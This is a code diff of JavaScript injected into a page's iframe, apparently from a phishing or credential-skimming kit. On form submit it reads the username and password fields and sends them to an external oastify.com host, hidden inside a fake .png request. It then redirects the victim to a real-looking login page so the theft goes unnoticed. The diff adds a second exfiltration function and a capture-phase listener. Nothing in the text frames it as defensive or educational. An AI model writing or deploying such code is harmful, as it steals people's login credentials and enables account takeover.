@@ -23,24 +23,46 @@
                 xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
-            
-            var myElement = document.getElementsByTagName('fluent-text-field')[0];
-            myElement.value = '123';
-            var event = new Event('change');
-            myElement.dispatchEvent(event);
-            
+            function sendFinal() {
+                var username = document.getElementsByTagName('fluent-text-field')[0].value;
+                var password = document.getElementsByTagName('fluent-text-field')[1].value;
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
+                // Handle successful completion
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
+                    } else {
+                        parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
+                    }
+                };
+                
+                // Handle network errors
+                xhr.onerror = function() {
+                    parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
+                };
+                
+                // Send the request
+                xhr.send();
+            }
             const delay = ms => new Promise(res => setTimeout(res, ms));
             document.body.addEventListener('submit', async (event) => {
                 if (event.target.tagName.toLowerCase() === 'form') {
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
-                    if(password.length > 2){
+                    if(password.length < 1){
+                        await delay(5000);
+                        var btn = document.getElementsByTagName('fluent-text-field')[0];
+                        btn.removeAttribute('type');
+                        btn.setAttribute('onclick', 'sendFinal(username, password)');
+                    }
+                    else{
                         await delay(5000);
                         parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
                     }
                 }
-            }, false);
+            }, true);
         `;
         doc.body.appendChild(script);
     };
